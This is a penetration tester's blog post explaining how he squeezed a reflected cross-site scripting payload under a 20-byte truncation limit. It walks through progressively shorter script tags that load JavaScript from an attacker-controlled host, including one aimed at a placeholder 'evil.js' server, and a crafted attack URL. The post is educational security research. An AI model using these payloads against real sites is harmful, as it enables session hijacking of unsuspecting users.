<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Minifying XSS | JakobTheDev | Jakob Pennington</title><meta name=keywords content="Cross-Site Scripting,Penetration Testing"><meta name=description content="How I bypassed Cross-Site Scripting sanitisation in fewer than 20 characters."><meta name=author content="Jakob Pennington"><link rel=canonical href=https://www.jakobthe.dev/posts/minifying-xss/><meta name=google-site-verification content="G-29MNLJYDQX"><link crossorigin=anonymous href=/assets/css/stylesheet.3299c596a7007118365635c056dd427dace22b7b8c1341fdef6fa6c31359ba10.css integrity="sha256-MpnFlqcAcRg2VjXAVt1CfaziK3uME0H972+mwxNZuhA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.acb54fd32bbc1982428b8850317e45d076b95012730a5936667e6bc21777692a.js integrity="sha256-rLVP0yu8GYJCi4hQMX5F0Ha5UBJzClk2Zn5rwhd3aSo=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://www.jakobthe.dev/images/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://www.jakobthe.dev/images/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://www.jakobthe.dev/images/favicon-32x32.png><link rel=apple-touch-icon href=https://www.jakobthe.dev/images/apple-touch-icon.png><link rel=mask-icon href=https://www.jakobthe.dev/images/apple-touch-icon.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-29MNLJYDQX"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-29MNLJYDQX",{anonymize_ip:!1})}</script><meta property="og:title" content="Minifying XSS"><meta property="og:description" content="How I bypassed Cross-Site Scripting sanitisation in fewer than 20 characters."><meta property="og:type" content="article"><meta property="og:url" content="https://www.jakobthe.dev/posts/minifying-xss/"><meta property="og:image" content="https://www.jakobthe.dev/posts/minifying-xss/hero.webp"><meta property="article:section" content="posts"><meta property="article:published_time" content="2018-03-18T15:45:00+10:30"><meta property="article:modified_time" content="2018-03-18T15:45:00+10:30"><meta property="og:site_name" content="JakobTheDev"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://www.jakobthe.dev/posts/minifying-xss/hero.webp"><meta name=twitter:title content="Minifying XSS"><meta name=twitter:description content="How I bypassed Cross-Site Scripting sanitisation in fewer than 20 characters."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://www.jakobthe.dev/posts/"},{"@type":"ListItem","position":2,"name":"Minifying XSS","item":"https://www.jakobthe.dev/posts/minifying-xss/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Minifying XSS","name":"Minifying XSS","description":"How I bypassed Cross-Site Scripting sanitisation in fewer than 20 characters.","keywords":["Cross-Site Scripting","Penetration Testing"],"articleBody":"Cross-Site Scripting is still one of the most prevalent web application vulnerabilities, and has featured in each revision of the OWASP Top 10 since the list was first published in 2010. Peaking at #2 in 2010, XSS was knocked off the podium for the first time in 2017, coming in at #7 on the list. This demotion may be due to the rise in popularity in Single Page Application (SPA) front-end frameworks such as React, Angular and Vue, which often include built-in sanitation to prevent these attacks.\nHowever, where there is a will, there‚Äôs a way.\nWhile these frameworks do the heavy lifting to avoid these types of vulnerabilities, developers can (and do) bypass the framework and manipulate the DOM directly, which can introduce XSS vulnerabilities. Sometimes the frameworks get it wrong too, and people find ways to circumvent these protections. Not to mention that many applications on the web are using old frameworks or are hand-rolled and are riddled with dangerous DOM manipulation, which gets pentesters like me (and probably you) excited.\nAs we will see, websites can remain vulnerable to XSS attacks, even if the attack is detected. You just have to get a little crafty.\nAn Ironic XSS Vulnerability I recently came across a XSS vulnerability that got me thinking. It seemed like a run-of-the-mill reflected XSS vulnerability; a URL parameter was injected directly into the HTML in the page which could let a baddy make a link which they could send in a phishing email and do nasty things to the victim. Something like this:\nhttps://www.mysecuresite.com/paymentDetails.html?userid=\u003cscript\u003esomeMaliciousCode()\u003c/script\u003e The site was smart enough to recognise the attack, and rather helpfully displayed a small snippet of the code in an error page to the user. The first 20 bytes of the vulnerable URL parameter were loaded into the page, and the rest were truncated. The developers of the site must have realised that 20 bytes is far too few for any useful JavaScript, thus preventing an XSS attack. Surely‚Ä¶\nWait‚Ä¶ Bytes or Characters? Before we go on, there‚Äôs something I need to clarify which will become important later on. You may have noticed that most websites use simple characters in their URLs. Domain names are mostly letters from the Latin alphabet (such as www.medium.com), and there may be some numbers and other characters like slashes and ampersands. These characters are all from the ASCII character set, which consists of 256 characters used commonly in English speaking countries. Originally, this is all that was supported. Somebody said ‚Äúthou shall only use ASCII characters in domain names‚Äù, and so we did that for a bit.\nBut the World Wide Web is just that, its for people of all nationalities and languages. Sure, we can fit all our Latin uppercase and lowercase letters in the ASCII character set, with a few spots left over for numbers and punctuation, but what about Hebrew? What about Arabic, or Chinese? Or variations of letters which give us pi√±atas and √úber?\nTechnically, this causes a problem. You see, ASCII includes 256 characters because they can be nicely represented using a single byte, or 8 bits of 1s and 0s. But if we want to include all of these other letters and symbols, we‚Äôre going to need a bigger character set, which means more bytes-per-character.\nA very, very long story short, this is where Unicode comes to the rescue. Through various iterations of the Internationalised Domain Names specification, we can now use a subset of the Unicode character set in our domain names! This monster of a character set includes 139 different scripts, plus a bunch of symbol sets which includes, wait for it. Emoji.\nLong story short, we can use emoji and other symbols in our domain names, but we have to be wary that one character does not always equal one byte, which is important when you only have 20 bytes to play with.\nLet‚Äôs Begin So we have ourselves a challenge: can we inject malicious JavaScript in just 20 bytes? The irony of an XSS vulnerability in a page that tells the user they have been saved from an XSS attack is too much of a carrot not to chase.\nBaseline Length: Unlimited\n\u003cscript\u003esomeMaliciousCode()\u003c/script\u003e In it‚Äôs most simplest form, malicious JavaScript can be inserted into a page surrounded by tags. This approach is fine where you don‚Äôt have any restrictions on the size of the payload, but in our case, it‚Äôs not going to cut it. A simple keylogger can weigh in at over 300 bytes, which is waaay over our 20 byte target. In fact, if we count the number of characters in the script tags alone, we‚Äôre already at 17 bytes, giving us just three left to play with. I don‚Äôt know what your JS skills are like, but I can‚Äôt do a lot with three characters.\nMilestone 1: Loading a¬†script Length: 50 characters\n\u003cscript src='https://www.1337hacker.com/evil.js'\u003e This is a more common approach for exploiting XSS in the wild. Let‚Äôs put our malicious JavaScript in a file and host it on our web server. We can then make a payload which simply loads our script and has it executed by the browser. This is nice because it lets us load effectively any JavaScript in just 50 characters. We can even build up a little library of JS payloads on our web server and reuse then in different attacks. However, in this case, we‚Äôre still over our limit.\nMilestone 2: Shortening our¬†domain Length: 27 characters\n\u003cscript src='https://a.io'\u003e Shortening our domain name goes a long way to bringing us closer to our target. The shortest Top-Level Domains (TLDs), such as¬†.io (Indian Ocean) or¬†.uk (United Kingdom) are three characters long when you include the prefixed period. All we need to do is register a single character domain and we have the shortest possible Fully Qualified Domain Name (FQDN)!\nIt turns out a bunch of other people had the same idea, and it‚Äôs pretty hard to get you hands on such a short domain name. More on this later üòâ But for now, let‚Äôs continue building our Proof-of-Concept.\nWe‚Äôve also removed the name of the file containing our naughty little script. We can do this by configuring our web server to host our script at the root of the web server, similar to how www.reddit.com gives you the front page of the internet.\nMilestone 3: Inheriting the¬†Protocol Length: 21 characters\n\u003cscript src='//a.io'\u003e So. Close. It turns out, if we remove the ‚Äòhttps:‚Äô from the beginning of the URL, the browser will default to using the same protocol that was used to load the parent page. For example, if we send out a link like this:\nhttp://www.mysecuresite.com/paymentDetails.html?userid=\u003cscript src='//a.io'\u003e The script will be loaded over HTTP since www.mysecuresite.com is being accessed over HTTP.\nNow, if I‚Äôm being honest, I thought I was done here. Just one character shy of the target, and I thought I had reached the limit. A little disheartened, I contacted some friends and presented them with the challenge. Was there something I was missing that could get us below our 20 byte payload?\nMilestone 4: Removing quotation marks Length: 19 characters\n\u003cscript src=//a.io\u003e As it turns out, there was! The quotation marks surrounding the URL are superfluous; the script loads just fine without them! And with that, we had come up with a Proof-of-Concept payload which would load arbitrary JavaScript into the user‚Äôs browser and let us hijack their session. Pretty cool, huh!\nHacking with¬†Emoji The PoC payload was enough to demonstrate that somebody with a short domain name could exploit the XSS vulnerability, which was enough to convince the developers to fix it. But where‚Äôs the fun in that?\nRemember that spiel about Internationalised Domain Names supporting Emoji? Well at this point, I jumped onto https://i‚ù§.ws/ to see what the going rate was for a single emoji domain, and boy was I in for a surprise. A domain like ü§£.ws could set you back USD$50k! I looked in my wallet and remembered I‚Äôm not made of cash, so I settled for something a little less lucrative.\nBut, I can now say I‚Äôm the proud owner of ‚öø.ws. The question remains, can I use this to exploit our XSS vulnerability? Sadly, no. The ‚öø character (squared key, for anybody whose browser doesn‚Äôt support the emoji) is three bytes in size, which brings our payload to 21 bytes.\nSo close, yet so far‚Ä¶\nSo there it is, the shortest XSS payload I could come up with (with a little help) was 19 bytes with the right domain, or 21 bytes with my emoji domain. If you know of any other tricks to reduce the size, let me us know in the comments below!\nThanks for reading!\nIf you enjoyed this post, follow on Twitter or Mastodon for more content. If you have any feedback or suggestions, leave it in the comments below and I‚Äôll do my best to get back to you.\n","wordCount":"1492","inLanguage":"en","image":"https://www.jakobthe.dev/posts/minifying-xss/hero.webp","datePublished":"2018-03-18T15:45:00+10:30","dateModified":"2018-03-18T15:45:00+10:30","author":{"@type":"Person","name":"Jakob Pennington"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://www.jakobthe.dev/posts/minifying-xss/"},"publisher":{"@type":"Organization","name":"JakobTheDev | Jakob Pennington","logo":{"@type":"ImageObject","url":"https://www.jakobthe.dev/images/favicon.ico"}}}</script><a rel=me style=display:none href=https://infosec.exchange/@JakobTheDev>Mastodon</a></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://www.jakobthe.dev/ accesskey=h title="Home (Alt + H)">Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://www.jakobthe.dev/about title=About><span>About</span></a></li><li><a href=https://www.jakobthe.dev/posts/ title=Blog><span>Blog</span></a></li><li><a href=https://www.jakobthe.dev/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://www.jakobthe.dev/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://www.jakobthe.dev/>Home</a>&nbsp;¬ª&nbsp;<a href=https://www.jakobthe.dev/posts/>Posts</a></div><h1 class=post-title>Minifying XSS</h1><div class=post-description>How I bypassed Cross-Site Scripting sanitisation in fewer than 20 characters.</div><div class=post-meta><span title='2018-03-18 15:45:00 +1030 ACDT'>18 March 2018</span>&nbsp;¬∑&nbsp;8 min&nbsp;¬∑&nbsp;1492 words&nbsp;¬∑&nbsp;Jakob Pennington&nbsp;|&nbsp;<a href=https://github.com/JakobTheDev/website/content/posts/1-minifying-xss/index.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><figure class=entry-cover><a href=https://www.jakobthe.dev/posts/minifying-xss/hero.webp target=_blank rel="noopener noreferrer"><img loading=lazy srcset="https://www.jakobthe.dev/posts/minifying-xss/hero_huecb6f0c104770a2804d06679728e6721_1604_360x0_resize_q75_h2_box_2.webp 360w ,https://www.jakobthe.dev/posts/minifying-xss/hero_huecb6f0c104770a2804d06679728e6721_1604_480x0_resize_q75_h2_box_2.webp 480w ,https://www.jakobthe.dev/posts/minifying-xss/hero_huecb6f0c104770a2804d06679728e6721_1604_720x0_resize_q75_h2_box_2.webp 720w ,https://www.jakobthe.dev/posts/minifying-xss/hero_huecb6f0c104770a2804d06679728e6721_1604_1080x0_resize_q75_h2_box_2.webp 1080w ,https://www.jakobthe.dev/posts/minifying-xss/hero.webp 1100w" sizes="(min-width: 768px) 720px, 100vw" src=https://www.jakobthe.dev/posts/minifying-xss/hero.webp alt="A graphic of a HTML script tag fading into the background." width=1100 height=155></a></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#an-ironic-xss-vulnerability>An Ironic XSS Vulnerability</a></li><li><a href=#wait-bytes-or-characters>Wait‚Ä¶ Bytes or Characters?</a></li><li><a href=#lets-begin>Let&rsquo;s Begin</a><ul><li><a href=#baseline>Baseline</a></li><li><a href=#milestone-1-loading-ascript>Milestone 1: Loading a¬†script</a></li><li><a href=#milestone-2-shortening-ourdomain>Milestone 2: Shortening our¬†domain</a></li><li><a href=#milestone-3-inheriting-theprotocol>Milestone 3: Inheriting the¬†Protocol</a></li><li><a href=#milestone-4-removing-quotation-marks>Milestone 4: Removing quotation marks</a></li><li><a href=#hacking-withemoji>Hacking with¬†Emoji</a></li></ul></li></ul></nav></div></details></div><div class=post-content><p>Cross-Site Scripting is still one of the most prevalent web application vulnerabilities, and has featured in each revision of the <a href=https://owasp.org/www-project-top-ten/>OWASP Top 10</a> since the list was first published in 2010. Peaking at #2 in 2010, XSS was knocked off the podium for the first time in 2017, coming in at #7 on the list. This demotion may be due to the rise in popularity in Single Page Application (SPA) front-end frameworks such as React, Angular and Vue, which often include built-in sanitation to prevent these attacks.</p><p>However, where there is a will, there&rsquo;s a way.</p><p>While these frameworks do the heavy lifting to avoid these types of vulnerabilities, developers can (<a href=https://medium.com/node-security/the-most-common-xss-vulnerability-in-react-js-applications-2bdffbcc1fa0>and do</a>) bypass the framework and manipulate the DOM directly, which can introduce XSS vulnerabilities. Sometimes the frameworks <a href=http://blog.portswigger.net/2017/09/abusing-javascript-frameworks-to-bypass.html>get it wrong too</a>, and people find ways to circumvent these protections. Not to mention that many applications on the web are using old frameworks or are hand-rolled and are riddled with dangerous DOM manipulation, which gets pentesters like me (and probably you) excited.</p><p>As we will see, websites can remain vulnerable to XSS attacks, even if the attack is detected. You just have to get a little crafty.</p><h2 id=an-ironic-xss-vulnerability>An Ironic XSS Vulnerability<a hidden class=anchor aria-hidden=true href=#an-ironic-xss-vulnerability>#</a></h2><p>I recently came across a XSS vulnerability that got me thinking. It seemed like a run-of-the-mill <a href=https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting>reflected XSS</a> vulnerability; a URL parameter was injected directly into the HTML in the page which could let a baddy make a link which they could send in a phishing email and do nasty things to the victim. Something like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>https://www.mysecuresite.com/paymentDetails.html?userid=<span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>someMaliciousCode</span><span class=p>()&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>The site was smart enough to recognise the attack, and rather helpfully displayed a small snippet of the code in an error page to the user. The first 20 bytes of the vulnerable URL parameter were loaded into the page, and the rest were truncated. The developers of the site must have realised that 20 bytes is far too few for any useful JavaScript, thus preventing an XSS attack. Surely‚Ä¶</p><h2 id=wait-bytes-or-characters>Wait‚Ä¶ Bytes or Characters?<a hidden class=anchor aria-hidden=true href=#wait-bytes-or-characters>#</a></h2><p>Before we go on, there&rsquo;s something I need to clarify which will become important later on. You may have noticed that most websites use simple characters in their URLs. Domain names are mostly letters from the Latin alphabet (such as <a href=https://www.medium.com/>www.medium.com</a>), and there may be some numbers and other characters like slashes and ampersands. These characters are all from the <a href=https://www.asciitable.com/>ASCII character set</a>, which consists of 256 characters used commonly in English speaking countries. Originally, this is all that was supported. Somebody said &ldquo;thou shall only use ASCII characters in domain names&rdquo;, and so we did that for a bit.</p><p>But the World Wide Web is just that, its for people of all nationalities and languages. Sure, we can fit all our Latin uppercase and lowercase letters in the ASCII character set, with a few spots left over for numbers and punctuation, but what about Hebrew? What about Arabic, or Chinese? Or variations of letters which give us pi√±atas and √úber?</p><p>Technically, this causes a problem. You see, ASCII includes 256 characters because they can be nicely represented using a single byte, or 8 bits of 1s and 0s. But if we want to include all of these other letters and symbols, we&rsquo;re going to need a bigger character set, which means more bytes-per-character.</p><p>A <a href=http://www.developerknowhow.com/1091/the-history-of-character-encoding>very</a>, <a href=https://danielmiessler.com/study/encoding/>very</a> long story short, this is where Unicode comes to the rescue. Through various iterations of the <a href=http://unicode.org/faq/idn.html>Internationalised Domain Names</a> specification, we can now use a subset of the Unicode character set in our domain names! This monster of a character set includes 139 different scripts, plus a bunch of symbol sets which includes, wait for it. Emoji.</p><p>Long story short, we can use emoji and other symbols in our domain names, but we have to be wary that one character does not always equal one byte, which is important when you only have 20 bytes to play with.</p><h2 id=lets-begin>Let&rsquo;s Begin<a hidden class=anchor aria-hidden=true href=#lets-begin>#</a></h2><p>So we have ourselves a challenge: can we inject malicious JavaScript in just 20 bytes? The irony of an XSS vulnerability in a page that tells the user they have been saved from an XSS attack is too much of a carrot not to chase.</p><h3 id=baseline>Baseline<a hidden class=anchor aria-hidden=true href=#baseline>#</a></h3><p><em>Length:</em> Unlimited</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>someMaliciousCode</span><span class=p>()&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>In it&rsquo;s most simplest form, malicious JavaScript can be inserted into a page surrounded by tags. This approach is fine where you don&rsquo;t have any restrictions on the size of the payload, but in our case, it&rsquo;s not going to cut it. A <a href=https://github.com/JohnHoder/Javascript-Keylogger/blob/master/keylogger.js>simple keylogger</a> can weigh in at over 300 bytes, which is waaay over our 20 byte target. In fact, if we count the number of characters in the script tags alone, we&rsquo;re already at 17 bytes, giving us just three left to play with. I don&rsquo;t know what your JS skills are like, but I can&rsquo;t do a lot with three characters.</p><h3 id=milestone-1-loading-ascript>Milestone 1: Loading a¬†script<a hidden class=anchor aria-hidden=true href=#milestone-1-loading-ascript>#</a></h3><p><strong>Length:</strong> 50 characters</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#39;https://www.1337hacker.com/evil.js&#39;</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>This is a more common approach for exploiting XSS in the wild. Let&rsquo;s put our malicious JavaScript in a file and host it on our web server. We can then make a payload which simply loads our script and has it executed by the browser. This is nice because it lets us load effectively any JavaScript in just 50 characters. We can even build up a little library of JS payloads on our web server and reuse then in different attacks. However, in this case, we&rsquo;re still over our limit.</p><h3 id=milestone-2-shortening-ourdomain>Milestone 2: Shortening our¬†domain<a hidden class=anchor aria-hidden=true href=#milestone-2-shortening-ourdomain>#</a></h3><p><strong>Length:</strong> 27 characters</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#39;https://a.io&#39;</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>Shortening our domain name goes a long way to bringing us closer to our target. The shortest <a href=https://en.wikipedia.org/wiki/List_of_Internet_top-level_domains>Top-Level Domains</a> (TLDs), such as¬†.io (Indian Ocean) or¬†.uk (United Kingdom) are three characters long when you include the prefixed period. All we need to do is register a single character domain and we have the shortest possible Fully Qualified Domain Name (FQDN)!</p><p>It turns out a bunch of other people had the same idea, and it&rsquo;s pretty hard to get you hands on such a short domain name. More on this later üòâ But for now, let&rsquo;s continue building our Proof-of-Concept.</p><p>We&rsquo;ve also removed the name of the file containing our naughty little script. We can do this by configuring our web server to host our script at the root of the web server, similar to how <a href=http://www.reddit.com/>www.reddit.com</a> gives you the front page of the internet.</p><h3 id=milestone-3-inheriting-theprotocol>Milestone 3: Inheriting the¬†Protocol<a hidden class=anchor aria-hidden=true href=#milestone-3-inheriting-theprotocol>#</a></h3><p><strong>Length:</strong> 21 characters</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#39;//a.io&#39;</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>So. Close. It turns out, if we remove the &lsquo;https:&rsquo; from the beginning of the URL, the browser will default to using the <a href=https://stackoverflow.com/questions/550038/is-it-valid-to-replace-http-with-in-a-script-src-http>same protocol</a> that was used to load the parent page. For example, if we send out a link like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>http://www.mysecuresite.com/paymentDetails.html?userid=<span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#39;//a.io&#39;</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>The script will be loaded over HTTP since <a href=https://www.mysecuresite.com>www.mysecuresite.com</a> is being accessed over HTTP.</p><p>Now, if I&rsquo;m being honest, I thought I was done here. Just one character shy of the target, and I thought I had reached the limit. A little disheartened, I contacted some friends and presented them with the challenge. Was there something I was missing that could get us below our 20 byte payload?</p><h3 id=milestone-4-removing-quotation-marks>Milestone 4: Removing quotation marks<a hidden class=anchor aria-hidden=true href=#milestone-4-removing-quotation-marks>#</a></h3><p><strong>Length:</strong> 19 characters</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>//a.io</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>As it turns out, there was! The quotation marks surrounding the URL are superfluous; the script loads just fine without them! And with that, we had come up with a Proof-of-Concept payload which would load arbitrary JavaScript into the user&rsquo;s browser and let us hijack their session. Pretty cool, huh!</p><h3 id=hacking-withemoji>Hacking with¬†Emoji<a hidden class=anchor aria-hidden=true href=#hacking-withemoji>#</a></h3><p>The PoC payload was enough to demonstrate that somebody with a short domain name could exploit the XSS vulnerability, which was enough to convince the developers to fix it. But where&rsquo;s the fun in that?</p><p>Remember that spiel about Internationalised Domain Names supporting Emoji? Well at this point, I jumped onto <a href="https://xn--i-7iq.ws/marketplace/1?filter=1char">https://i‚ù§.ws/</a> to see what the going rate was for a single emoji domain, and boy was I in for a surprise. A domain like <a href=https://xn--i-7iq.ws/aftermarket/xn--cq9h.ws>ü§£.ws</a> could set you back USD$50k! I looked in my wallet and remembered I&rsquo;m not made of cash, so I settled for something a little less lucrative.</p><p>But, I can now say I&rsquo;m the proud owner of ‚öø.ws. The question remains, can I use this to exploit our XSS vulnerability? Sadly, no. The ‚öø character (squared key, for anybody whose browser doesn&rsquo;t support the emoji) is three bytes in size, which brings our payload to 21 bytes.</p><p>So close, yet so far‚Ä¶</p><hr><p>So there it is, the shortest XSS payload I could come up with (with a little help) was 19 bytes with the right domain, or 21 bytes with my emoji domain. If you know of any other tricks to reduce the size, let me us know in the comments below!</p><hr><p><strong>Thanks for reading!</strong><br>If you enjoyed this post, follow on <a href=https://www.twitter.com/@JakobTheDev>Twitter</a> or <a href=https://infosec.exchange/@JakobTheDev>Mastodon</a> for more content. If you have any feedback or suggestions, leave it in the comments below and I&rsquo;ll do my best to get back to you.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://www.jakobthe.dev/tags/cross-site-scripting/>Cross-Site Scripting</a></li><li><a href=https://www.jakobthe.dev/tags/penetration-testing/>Penetration Testing</a></li></ul><nav class=paginav><a class=prev href=https://www.jakobthe.dev/posts/deploy-spa-aws/><span class=title>¬´ Prev</span><br><span>Deploy a Single Page Application (SPA) to AWS</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Minifying XSS on twitter" href="https://twitter.com/intent/tweet/?text=Minifying%20XSS&url=https%3a%2f%2fwww.jakobthe.dev%2fposts%2fminifying-xss%2f&hashtags=Cross-SiteScripting%2cPenetrationTesting"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Minifying XSS on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fwww.jakobthe.dev%2fposts%2fminifying-xss%2f&title=Minifying%20XSS&summary=Minifying%20XSS&source=https%3a%2f%2fwww.jakobthe.dev%2fposts%2fminifying-xss%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Minifying XSS on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fwww.jakobthe.dev%2fposts%2fminifying-xss%2f&title=Minifying%20XSS"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Minifying XSS on facebook" 